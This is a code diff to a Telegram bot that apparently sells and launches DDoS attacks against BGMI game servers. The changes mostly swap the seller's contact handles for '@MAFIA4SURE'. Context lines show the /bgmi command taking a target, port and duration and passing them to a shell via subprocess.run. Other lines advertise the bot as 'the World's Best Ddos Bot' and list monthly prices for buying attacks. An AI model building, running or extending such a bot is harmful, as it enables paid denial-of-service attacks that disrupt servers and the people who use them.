@@ -128,7 +128,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command🙂"
+        response = "Only mafia4sure Can Run This Command🙂"
 
     bot.reply_to(message, response)
 
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃✨\n\n😉𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n😅𝐏𝐨𝐫𝐭: {port}\n😶𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n😁𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n❤️‍🩹 @CiConfigOfficial"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃✨\n\n😉𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n😅𝐏𝐨𝐫𝐭: {port}\n😶𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n😁𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n❤️‍🩹 @mMAFIA4SURE"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -246,9 +246,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished✅ Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅Usage :- /bgmi <target> <port> <time>\n❤️‍🩹@CiConfigOfficial"  # Updated command syntax
+            response = "✅Usage :- /bgmi <target> <port> <time>\n❤️‍🩹@MAFIA4SURE"  # Updated command syntax
     else:
-        response = "⚠️You Are Not Authorized To Use This Command.\n🫂Contact @CiConfigOwner"
+        response = "⚠️You Are Not Authorized To Use This Command.\n🫂Contact @MAFIA4SURE"
 
     bot.reply_to(message, response)
 
@@ -298,7 +298,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"👾Welcome to Your Home, {user_name}! Feel Free to Explore.\n🥰Run This Command : /help\n🥇Welcome To The World's Best Ddos Bot\n❤️‍🩹 @CiConfigOwner\nTG :- t.me/CiConfigOfficial"
+    response = f"👾Welcome to Your Home, {user_name}! Feel Free to Explore.\n🥰Run This Command : /help\n🥇Welcome To The World's Best Ddos Bot\n❤️‍🩹 @MAFIA4SURE"
     bot.reply_to(message, response)
 
 
@@ -326,7 +326,7 @@ def welcome_rules(message):
 𝗕𝗖𝗭 𝗔𝗟𝗟 𝗕𝗔𝗡 𝗥𝗘𝗔𝗦𝗢𝗡 𝗩𝗘𝗥𝗜𝗙𝗘𝗗 𝗕𝗬 𝗠𝗘 𝗢𝗡 𝗕𝗚𝗠𝗜 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 ✅‼️... 
 
 𝗦𝗼 𝗣𝗹𝗮𝘆 𝗦𝗮𝗳𝗲𝗹𝘆 ☠️⚠️
-By @NooRPB22'''
+By @MAFIA4SURE'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -346,7 +346,7 @@ def welcome_plan(message):
 😀Month-->900 Rs
 
 Dm to buy ddos 🔗
-Dm - @CiConfigOwner
+Dm - @MAFIA4SURE
 '''
     bot.reply_to(message, response)
 
